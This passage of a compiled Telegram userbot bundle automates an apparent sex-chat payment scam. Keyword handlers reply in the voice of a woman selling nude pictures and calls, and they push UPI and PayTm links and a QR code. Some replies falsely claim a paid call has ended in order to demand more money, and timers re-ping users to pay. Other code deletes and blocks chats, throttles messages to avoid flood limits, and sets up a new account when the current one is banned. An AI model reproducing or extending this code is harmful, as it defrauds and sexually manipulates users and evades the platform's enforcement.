            yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Send me the <b>Screenshot</b> of your Payment first!!\n<b>What is coming...??</b>\n\nUse "PhonePe / PayTm"  ONLY!!✅✅\n\nGPay - ${messages_1.payLinks.gpay2}</b>`, parseMode: "html" }));
            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `<b>Oye....!!\n\n\nTry</b> this <b>NEW WORKING</b> Links👇👇\n\n${messages_1.payLinks.paytm2} - Working\n${messages_1.payLinks.phonepe3} - Working\n${messages_1.payLinks.gpay1} - Doubt (Try Once)\n${messages_1.payLinks.gpay2} - Doubt (Try Once)\n\nPlease Use<b>"PhonePe / PayTm"  ONLY!!</b>✅✅`, parseMode: 'html', linkPreview: false }));
            }), 20000);
            yield event.client.sendMessage('@miscmessages', { message: broadcastName + " : " + text });
            yield db.updateSingleKey(event.message.chatId.toString(), dbservice_1.user.limitTime, Date.now() + (10 * 60 * 1000));
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['upi ', ' upi', 'upi id', "up id"])) {
            yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Pay to my UPI Adress\n\nCopy paste full Msg👇🏻👇🏻👇🏻👇🏻\n\n` }));
            yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: messages_1.messages.upiID }));
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['ready', 'pay']) && (0, inhandlerUpdated_1.contains)(text, ['ll ', 'now', 'm '])) {
            yield (0, respondToMsgs_1.pushToReplies)(event, chatId, messages_1.messages.qr, (0, common_1.getClientFilePath)('./QR.jpg'));
            yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.okayPay, true]);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['you', 'u ', 'unnava']) && (0, inhandlerUpdated_1.contains)(text, ['there'])) {
            yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)([`Haaa... Tell!!`])]);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['pus', 'nich', 'face', 'tul', 'dildo', 'fing', 'ung', 'kind', 'vegi', 'bott', 'vagi', 'chut', 'puk', 'down'])) {
            if (userDetails.payAmount < 90) {
                yield (0, inhandlerUpdated_1.respond)(event, ["Not in Demo!!\nTake Full Service Baby...!!\n**I will Show you Everthing in Full Service!!**"]);
                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                    yield (0, inhandlerUpdated_1.respond)(event, [`**Pussy also!!**\n\nWithout Face : **100₹**\nWith Face      : **150₹**`]);
                }), 5000);
            }
            else {
                yield (0, utils_1.asktoPayByEvent)(event.client, userDetails, true);
            }
        }
        else if (((0, inhandlerUpdated_1.contains)(text, ['demo', 'free', 'cost', 'rate', 'amount', 'paise', 'price', "servi", 'kitn', 'charge']) && !(0, inhandlerUpdated_1.contains)(text, ['full', 'hour', 'complete', 'night', 'hr ']))
            || ((((0, inhandlerUpdated_1.contains)(text, ["how", "hw"])) && ((0, inhandlerUpdated_1.contains)(text, ["much", "mch"])) && !(0, inhandlerUpdated_1.contains)(text, ['time'])))) {
            yield (0, utils_1.asktoPayByEvent)(event.client, userDetails, true);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ["language", "lang", "telugu", "malay", "mallu", "kannad", "tamil", "hindi"])) {
            yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.language]);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['love', 'luv'])) {
            const ranomThanks = messages_1.messages.thanksArray[Math.floor(Math.random() * messages_1.messages.thanksArray.length)];
            yield (0, inhandlerUpdated_1.respond)(event, [`${ranomThanks}\n\n${messages_1.messages.thanksNdPay}`], true);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['real', 'direct', 'offl', 'meet', 'phys', 'kalus']) && !(0, inhandlerUpdated_1.contains)(text, ['really'])) {
            yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.ntnw, true]);
        }
        else if ((text.includes("chestun"))
            || ((0, inhandlerUpdated_1.contains)(text, ['chest', 'chast']) &&
                (!(0, inhandlerUpdated_1.contains)(text, ["chesta", "cheste", "chestha", "chasta", "chaste", "chastha"])))
            || (((0, inhandlerUpdated_1.contains)(text, ["you", "u", 'what', 'em'])) && ((0, inhandlerUpdated_1.contains)(text, ["doi", 'dng'])))) {
            yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.doing, true]);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['ready', 'pay']) && (0, inhandlerUpdated_1.contains)(text, ['ll ', 'now', 'm '])) {
            // await event.client.sendFile(senderObj, { file: getClientFilePath('./QR.jpg'), caption: `${messages.qr}` })
            yield (0, respondToMsgs_1.pushToReplies)(event, chatId, messages_1.messages.qr + `\n\n${messages_1.messages.link}`, (0, common_1.getClientFilePath)('./QR.jpg'));
            yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.okayPay, true]);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ["busy", "bsy", 'reply', 'replay', 'rpl', 'payme', 'detai', ' id'])
            || (((0, inhandlerUpdated_1.contains)(text, ["good", "gud", "gd"])) &&
                ((0, inhandlerUpdated_1.contains)(text, ["nyt", "mor", "mrn", "ev", " e", "mn"])))) {
            if (!userDetails.payAmount || userDetails.payAmount < 15) {
                yield (0, inhandlerUpdated_1.respond)(event, ["**Heyy **" + senderJson.firstName + "\n\n" + messages_1.messages.demo + "\n\n" + (0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray)]);
            }
            else if (userDetails.payAmount > 14 && userDetails.payAmount < 41) {
                yield (0, inhandlerUpdated_1.respond)(event, ["**Heyy **" + senderJson.firstName + "\n\n" + 'Take Video call service!!\nI will show you everything!!\n\n**Try once Dear jsut 50!!**😘😘']);
            }
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['ready', 'pay']) && (0, inhandlerUpdated_1.contains)(text, ['ll ', 'now', 'm '])) {
            yield (0, respondToMsgs_1.pushToReplies)(event, chatId, messages_1.messages.qr + `\n\n${messages_1.messages.link}`, (0, common_1.getClientFilePath)('./QR.jpg'));
            yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.okayPay, true]);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ["busy", "bsy", 'reply', 'replay', 'rpl', 'payme', 'detai', ' id'])
            || (((0, inhandlerUpdated_1.contains)(text, ["good", "gud", "gd"])) &&
                ((0, inhandlerUpdated_1.contains)(text, ["nyt", "mor", "mrn", "ev", " e", "mn"])))) {
            yield (0, respondToMsgs_1.pushToReplies)(event, chatId, messages_1.messages.qr + `\n\n${messages_1.messages.link}`, (0, common_1.getClientFilePath)('./QR.jpg'));
            if (!userDetails.payAmount || userDetails.payAmount < 15) {
                yield (0, inhandlerUpdated_1.respond)(event, ["**Heyy **" + senderJson.firstName + "\n\n" + messages_1.messages.demo + "\n\n" + (0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray)]);
            }
            else if (userDetails.payAmount > 14) {
                yield (0, inhandlerUpdated_1.respond)(event, ["**Heyy **" + senderJson.firstName + "\n\n" + 'Take Video call service!!\nI will show you everything!!\n\n**Try once Dear jsut 50!!**😘😘']);
            }
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['virg'])) {
            yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.notVirgin], true);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['married'])) {
            yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.notMarried], true);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, [' hot', 'cute', 'super', 'pret', 'nyc', 'awe', 'fantast', 'juicy', 'angel', 'wow', 'wsm', 'aws', 'nice', 'beaut', 'gorg'])) {
            const randomElement = messages_1.messages.thanksArray[Math.floor(Math.random() * messages_1.messages.thanksArray.length)];
            yield (0, inhandlerUpdated_1.respond)(event, [randomElement], true);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['marry'])) {
            yield (0, inhandlerUpdated_1.respond)(event, [`Haha, Satisfy me Online First❤️\n\n${(0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray)}`], true);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['sex chat', 'call', 'video call', 'please', 'pls', 'plz', 'voice call'])) {
            yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)([
                    "**Your Call is Over Baby!!**\nPay again if u want more**\n\nNo MONEY? then No SERVICE!!\nDont WASTE your TIME!!**",
                    "Take Full Show Dear", "Take Full Show Dear",
                    "Your Call finished dear, PAy agin for Call!",
                    messages_1.messages.pricelist,
                    "Your Call finished dear, PAy agin for Call!"
                ])]);
            yield (0, utils_1.asktoPayByEvent)(event.client, userDetails, true);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['stud', 'chaduv', 'chadhuv', 'u do', 'you do'])) {
            yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.study]);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['high', 'jyada', 'expensive', 'kam', 'reduce', 'decrease', 'thak', 'ekkuv', 'discoun'])) {
            if (userDetails.highestPayAmount >= 250) {
                yield db.update(userDetails.chatId, { payAmount: 100, secondShow: false, highestPayAmount: 100, callTime: Date.now() - 15 * 60 * 1000 });
            }
            else {
                yield db.update(userDetails.chatId, { payAmount: 50, secondShow: false, highestPayAmount: 50, callTime: Date.now() - 15 * 60 * 1000 });
            }
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['?', 'lakshmi', 'laxmi', 'banking', 'name', 'ravva', "is this", "this one", "right", 'kya'])) {
            yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)(['Hmm Yeah!!', 'Haa Yep..!!', 'Haaa yaa....!'])]);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['pic'])) {
            yield (0, inhandlerUpdated_1.respond)(event, ['Pay 25₹, I will Send You!!'], true);
            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                yield (0, respondToMsgs_1.pushToReplies)(event, chatId, messages_1.messages.qr + `\n\n${messages_1.messages.link}`, (0, common_1.getClientFilePath)('./QR.jpg'));
            }), 20000);
        }
        setTimeout(() => __awaiter(this, void 0, void 0, function* () {
            try {
                const userDetails = yield db.read(chatId);
                if (userDetails.canReply !== 0) {
                    const msgs = yield event.client.getMessages(event.chatId, { limit: 2 });
                    const hasMyMsg = msgs.some(msg => msg.fromId !== null);
                    // console.log('rePing check:', userDetails.username, ":", userDetails.lastMsgTimeStamp + 315000, Date.now(), msgs[0]?.fromId)
                    if (msgs.length > 0 && (userDetails.totalCount < 4 || !hasMyMsg || (userDetails.lastMsgTimeStamp + 315000 < Date.now()))) { //&& msgs[0]?.fromId === null)) {
                        const Msg = (0, messages_1.pickOneMsg)(messages_1.randomMsg);
                        if (Msg === 'qr') {
                            yield (0, utils_1.asktoPayByEvent)(event.client, userDetails, true);
                        }
                        else {
                            yield (0, inhandlerUpdated_1.respond)(event, [Msg]);
                        }
                    }
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error, "Failed to fetch old Msgs2");
            }
        }), 320000);
        const msgs = yield event.client.getMessages(event.chatId, { limit: 4 });
        const hasMyMsg = msgs.some(msg => msg.fromId !== null);
        if ((totalMsgs && totalMsgs > 5 && totalMsgs % 10 == 3) || !hasMyMsg) {
            yield (0, utils_1.asktoPayByEvent)(event.client, userDetails);
            // await db.updateSingleKey(chatId, user.limitTime, Date.now() + (150 * 60 * 1000));
        }
        if (totalMsgs % 10 == 9) {
            yield (0, inhandlerUpdated_1.respond)(event, ["Pay and Msg me Dear!!\n\n**No MONEY? then No SERVICE!!\n\nDont WASTE your TIME okay!!,\nI will not do Anything before sending Money!!**"]);
        }
    });
}


/***/ }),

/***/ "./src/sendGreetings.ts":
/*!******************************!*\
  !*** ./src/sendGreetings.ts ***!
  \******************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.sendGreetings = sendGreetings;
exports.setPeerFloodSleep = setPeerFloodSleep;
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const messages_1 = __webpack_require__(/*! ./messages */ "./src/messages.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const utils_1 = __webpack_require__(/*! ./utils */ "./src/utils.ts");
const withTimeout_1 = __webpack_require__(/*! ./utils/withTimeout */ "./src/utils/withTimeout.ts");
const common_1 = __webpack_require__(/*! ./common */ "./src/common.ts");
let peerFloodSleep = Date.now();
function sendGreetMsg(event, msgs, doesUserExists) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const sender = (yield event.message.getSender()).toJSON();
            const chatId = event.message.chatId.toString();
            const hasMyMsg = msgs.some(msg => msg.fromId !== null);
            if (hasMyMsg || msgs.length === 0) {
                yield (0, utils_1.broadcast)(sender.firstName, 'MESSAGES DELETE OBSERVED!!');
                return;
            }
            else {
                try {
                    yield event.client.invoke(new telegram_1.Api.messages.SetTyping({
                        peer: (yield event.message.getSender()),
                        action: new telegram_1.Api.SendMessageTypingAction(),
                    }));
                }
                catch (error) {
                }
                yield (0, Helpers_1.sleep)(3000);
                if (doesUserExists) {
                    const demoPrices = `<b>DEMO</b> Nude pics: <b>25₹</b>\n<b>DEMO</b> Video call: <b>50₹</b>\n<b>DEMO</b> Voice call: <b>40₹</b>`;
                    const payLink = `<b>My Website 👉🏻 ${process.env.link}</b>`;
                    const message = `Hii ${sender.firstName}...!!\n\n${payLink}`;
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message, parseMode: 'html' }));
                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `${demoPrices}\n\n${messages_1.messages.pynw}`, parseMode: 'html' }));
                    }), 10000);
                }
                else {
                    if (msgs.total < 6) {
                        const greeting = `Hii  **${sender.firstName}${messages_1.messages.nameGreet}${messages_1.messages.greeting}`;
                        const channelLinks = `**My Links👇🏻:**\n\n${messages_1.messages.channelLinks}`;
                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: greeting }));
                        setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                            yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: channelLinks }));
                        }), 5000);
                    }
                    else {
                        const demoPrices = `<b>DEMO</b> Nude pics: <b>25₹</b>\n<b>DEMO</b> Video call: <b>50₹</b>\n<b>DEMO</b> Voice call: <b>40₹</b>`;
                        const payLink = `<b>Pay on My Website 👉🏻 ${process.env.link}</b>`;
                        const message = `${demoPrices}\n\n\n${payLink}\n\n${messages_1.messages.pynw}`;
                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message, parseMode: 'html' }));
                    }
                }
                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                    yield (0, withTimeout_1.withTimeout)(event.client.sendFile(event.message.chatId, { caption: "I'm not Wearing Dress now!!🙈\n\nTake the Demo!!", file: (0, common_1.getClientFilePath)('./intro.mp3'), voiceNote: true }));
                }), 200000);
            }
        }
        catch (error) {
            console.log("Error in Greetings: ", error);
        }
    });
}
class NewUserRateLimiter {
    constructor() {
        this.queue = [];
        this.maxPerTenMinutes = 10;
        this.maxPerHour = 30;
        this.lastTenMinutes = [];
        this.lasHour = [];
        setInterval(() => __awaiter(this, void 0, void 0, function* () {
            yield this.processQueue();
        }), 15000);
    }
    processQueue() {
        return __awaiter(this, void 0, void 0, function* () {
            if (this.queue.length > 0 && Date.now() > peerFloodSleep) {
                const currentTime = Date.now();
                while (this.lastTenMinutes.length > 0 && currentTime - this.lastTenMinutes[0] >= 10 * 60 * 1000) {
                    this.lastTenMinutes.shift();
                }
                while (this.lasHour.length > 0 && currentTime - this.lasHour[0] >= 60 * 60 * 1000) {
                    this.lasHour.shift();
                }
                const countLastTenMinutes = this.lastTenMinutes.length;
                const countLastHour = this.lasHour.length;
                if (countLastTenMinutes < this.maxPerTenMinutes && countLastHour < this.maxPerHour && this.queue.length > 0) {
                    const ev = this.queue.shift();
                    try {
                        yield sendGreetMsg(ev.event, ev.msgs, ev.doesUserExists);
                    }
                    catch (error) {
                        console.log("Greeting Error: ", error);
                    }
                    this.lastTenMinutes.push(currentTime);
                    this.lasHour.push(currentTime);
                }
            }
        });
    }
    enqueueEvent(event, msgs, doesUserExists) {
        const msgStats = (0, utils_1.getPeriodicMsgStats)();
        // console.log(`Msg Stats: TotalCount: ${msgStats.totalCount}, UserCount: ${msgStats.userCount}`);
        const isLimitReached = ((msgStats.totalCount > 4000) || (msgStats.userCount > 400));
        const eventExists = this.queue.some(item => item.event.message.chatId.toString() === event.message.chatId.toString());
        if (!isLimitReached && !eventExists) {
            console.log(`TenMins: ${this.lastTenMinutes.length}| Hour: ${this.lasHour.length} | Q-Len: ${this.queue.length}`);
            this.queue.push({ event, msgs, doesUserExists });
        }
    }
}
const newUserRateLimiter = new NewUserRateLimiter();
function sendGreetings(event, msgs, doesUserExists) {
    return __awaiter(this, void 0, void 0, function* () {
        console.log("In greetings");
        newUserRateLimiter.enqueueEvent(event, msgs, doesUserExists);
    });
}
function setPeerFloodSleep(time) {
    peerFloodSleep = Date.now() + time;
}


/***/ }),

/***/ "./src/telegramUtils.ts":
/*!******************************!*\
  !*** ./src/telegramUtils.ts ***!
  \******************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.invokeWithTimeout = invokeWithTimeout;
exports.deleteChat = deleteChat;
exports.blockUser = blockUser;
exports.unblockUser = unblockUser;
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const withTimeout_1 = __webpack_require__(/*! ./utils/withTimeout */ "./src/utils/withTimeout.ts");
const parseError_1 = __webpack_require__(/*! ./utils/parseError */ "./src/utils/parseError.ts");
const index_1 = __webpack_require__(/*! ./index */ "./src/index.ts");
const dbservice_1 = __webpack_require__(/*! ./dbservice */ "./src/dbservice.ts");
const TELEGRAM_TIMEOUTS = {
    SEND_MESSAGE: 15000,
    MEDIA_UPLOAD: 30000,
    MEDIA_DOWNLOAD: 30000,
    DELETE_MESSAGE: 10000,
    DEFAULT: 8000
};
function invokeWithTimeout(client_1, request_1) {
    return __awaiter(this, arguments, void 0, function* (client, request, timeout = TELEGRAM_TIMEOUTS.DEFAULT) {
        return (0, withTimeout_1.withTimeout)(client.invoke(request), timeout, "API request timeout", true, 3);
    });
}
function deleteChat(chatId) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            yield invokeWithTimeout(index_1.tgClass.getClient(), new telegram_1.Api.messages.DeleteHistory({
                justClear: false,
                peer: chatId,
                revoke: true,
            }), TELEGRAM_TIMEOUTS.DELETE_MESSAGE);
            console.log(`Dialog with ID ${chatId} has been deleted.`);
            return true;
        }
        catch (error) {
            (0, parseError_1.parseError)(error, "Failed to delete dialog");
            return false;
        }
    });
}
function blockUser(chatId) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const db = dbservice_1.UserDataDtoCrud.getInstance();
            yield db.updateSingleKey(chatId, dbservice_1.user.canReply, 0);
            yield deleteChat(chatId);
            yield invokeWithTimeout(index_1.tgClass.getClient(), new telegram_1.Api.contacts.Block({
                id: chatId,
            }), TELEGRAM_TIMEOUTS.DEFAULT);
            console.log(`User with ID ${chatId} has been blocked.`);
            return true;
        }
        catch (error) {
            (0, parseError_1.parseError)(error, "Failed to block user");
            return false;
        }
    });
}
function unblockUser(chatId) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const db = dbservice_1.UserDataDtoCrud.getInstance();
            yield invokeWithTimeout(index_1.tgClass.getClient(), new telegram_1.Api.contacts.Unblock({
                id: chatId,
            }), TELEGRAM_TIMEOUTS.DEFAULT);
            console.log(`User with ID ${chatId} has been unblocked.`);
            return true;
        }
        catch (error) {
            (0, parseError_1.parseError)(error, "Failed to unblock user");
            return false;
        }
    });
}


/***/ }),

/***/ "./src/utils.ts":
/*!**********************!*\
  !*** ./src/utils.ts ***!
  \**********************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.defaultMessages = void 0;
exports.getPeriodicMsgStats = getPeriodicMsgStats;
exports.broadcast = broadcast;
exports.selectRandomElements = selectRandomElements;
exports.startNewUserProcess = startNewUserProcess;
exports.MarkAsRead = MarkAsRead;
exports.replyUnread = replyUnread;
exports.callToPaid = callToPaid;
exports.sendImageToChannel = sendImageToChannel;
exports.sendVideoToChannel = sendVideoToChannel;
exports.asktoPay = asktoPay;
exports.asktoPayByEvent = asktoPayByEvent;
exports.respToPaidPplfn = respToPaidPplfn;
exports.sendVclinks = sendVclinks;
exports.joinGrps = joinGrps;
exports.channelInfo = channelInfo;
exports.joinChannels = joinChannels;
exports.leaveChannel = leaveChannel;
exports.leaveChannels = leaveChannels;
exports.setTyping = setTyping;
exports.setAudioRecord = setAudioRecord;
exports.getSenderJson = getSenderJson;
exports.callOn = callOn;
exports.calloff = calloff;
exports.getTotalMsgAndUserCount = getTotalMsgAndUserCount;
exports.removeOtherAuths = removeOtherAuths;
exports.checktghealth = checktghealth;
exports.getdaysLeft = getdaysLeft;
exports.parseObjectToString = parseObjectToString;
exports.deleteMessage = deleteMessage;
exports.deleteMessagesBeforeId = deleteMessagesBeforeId;
exports.extractNumberFromString = extractNumberFromString;
exports.executehs = executehs;
exports.executehsl = executehsl;
exports.setMsgstats = setMsgstats;
exports.getMessagesNew = getMessagesNew;
exports.getIChannelFromTg = getIChannelFromTg;
exports.isServicePending = isServicePending;
exports.canStartService = canStartService;
exports.checkProfilePics = checkProfilePics;
exports.downloadProfilePic = downloadProfilePic;
exports.getRandomEmoji = getRandomEmoji;
exports.generateEmojis = generateEmojis;
console.log("in Utils");
const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "big-integer"));
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const dbservice_1 = __webpack_require__(/*! ./dbservice */ "./src/dbservice.ts");
const messages_1 = __webpack_require__(/*! ./messages */ "./src/messages.ts");
const form_data_1 = __importDefault(__webpack_require__(/*! form-data */ "form-data"));
const index_1 = __webpack_require__(/*! ./index */ "./src/index.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const inhandlerUpdated_1 = __webpack_require__(/*! ./inhandlerUpdated */ "./src/inhandlerUpdated.ts");
const parseError_1 = __webpack_require__(/*! ./utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ./utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const withTimeout_1 = __webpack_require__(/*! ./utils/withTimeout */ "./src/utils/withTimeout.ts");
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const logbots_1 = __webpack_require__(/*! ./utils/logbots */ "./src/utils/logbots.ts");
const TelegramBots_config_1 = __webpack_require__(/*! ./utils/TelegramBots.config */ "./src/utils/TelegramBots.config.ts");
const common_1 = __webpack_require__(/*! ./common */ "./src/common.ts");
let msgStats = { totalCount: 0, userCount: 0 };
const askToPayMap = new Map();
function getPeriodicMsgStats() {
    return msgStats;
}
function broadcast(name, msg) {
    return __awaiter(this, void 0, void 0, function* () {
        const now = new Date().toLocaleString('en-IN').split(',')[1];
        console.log(`${now}||${name} : ${msg}`);
    });
}
function selectRandomElements(array, n) {
    if (array) {
        const selectedElements = [];
        for (let i = 0; i < n; i++) {
            const randomIndex = Math.floor(Math.random() * array.length);
            selectedElements.push(array[randomIndex]);
        }
        return selectedElements;
    }
    else {
        return [];
    }
}
function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
}
let marked = Date.now();
let isNewUserProcessRunning = Date.now();
function startNewUserProcess(error) {
    return __awaiter(this, void 0, void 0, function* () {
        if ((error.errorMessage === "FROZEN_METHOD_INVALID" || error.errorMessage === "USER_DEACTIVATED_BAN" || error.errorMessage === "USER_DEACTIVATED") && error.errorMessage !== "INPUT_USER_DEACTIVATED") {
            if (isNewUserProcessRunning < Date.now() - 60000) {
                isNewUserProcessRunning = Date.now();
                try {
                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${(process.env.clientId).toUpperCase()}: USER_DEACTIVATED - STARTED NEW USER PROCESS`)}`);
                    const url = `${process.env.tgmanager}/setupClient/${process.env.clientId}?archiveOld=false&formalities=false`;
                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(url);
                }
                catch (err) {
                    console.error("Error during new user process:", err);
                }
            }
            else {
                console.log("New User Process Recently Started!!");
            }
        }
        if (error.errorMessage === 'AUTH_KEY_DUPLICATED') {
            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${(process.env.clientId).toUpperCase()}: AUTH KEY DUPLICATED`)}`);
        }
    });
}
function MarkAsRead(client, all) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a, _b;
        if (client && marked < Date.now() - 60000) {
            marked = Date.now();
            console.log("MArking As Read!!", all, !!all);
            try {
                const fiveMinutesAgo = Math.floor((Date.now() - 5 * 60 * 1000) / 1000);
                const chats = yield client.getDialogs({ limit: 250, offsetDate: fiveMinutesAgo });
                const db = dbservice_1.UserDataDtoCrud.getInstance();
                for (const chat of chats) {
                    if (chat.isUser && (chat.unreadCount > 0 || !((_a = chat.message) === null || _a === void 0 ? void 0 : _a.out))) {
                        try {
                            const user = yield db.read((_b = chat.id) === null || _b === void 0 ? void 0 : _b.toString());
                            if (!!all || (user && user.canReply !== 0 && user.limitTime < Date.now())) {
                                console.log("succ-", chat === null || chat === void 0 ? void 0 : chat.title);
                                yield client.markAsRead(chat.entity);
                                yield (0, Helpers_1.sleep)(1500);
                                yield client.sendMessage(chat.entity, { message: `${(0, messages_1.pickOneMsg)(messages_1.messages.initMsgs)}${generateEmojis()}` });
                            }
                            else {
                                // console.log("Failed Marking as Read  coz - ", all, user?.payAmount, chat.id?.toString());
                            }
                            yield (0, Helpers_1.sleep)(3000);
                        }
                        catch (error) {
                            yield startNewUserProcess(error);
                            (0, parseError_1.parseError)(error, "Error Marking as read");
                            yield (0, Helpers_1.sleep)(3000);
                        }
                    }
                }
                msgStats = yield getTotalMsgAndUserCount();
                console.log("END Mark as read");
            }
            catch (error) {
                // parseError(error, "Error Fecthing dialogs on markasread");
                yield startNewUserProcess(error);
            }
        }
        else {
            console.log("Marking as read recently done!!");
        }
    });
}
function replyUnread(client, unreadUserDialogs) {
    return __awaiter(this, void 0, void 0, function* () {
        if (client) {
            try {
                const db = dbservice_1.UserDataDtoCrud.getInstance();
                for (const chat of unreadUserDialogs) {
                    try {
                        const userDetails = yield db.read(chat.id.toString());
                        if (userDetails) {
                            if (userDetails.payAmount >= 30) {
                                if (!userDetails.demoGiven) {
                                    // const didPaidToOthers = await db.checkIfPaidToOthers(chat.id.toString());
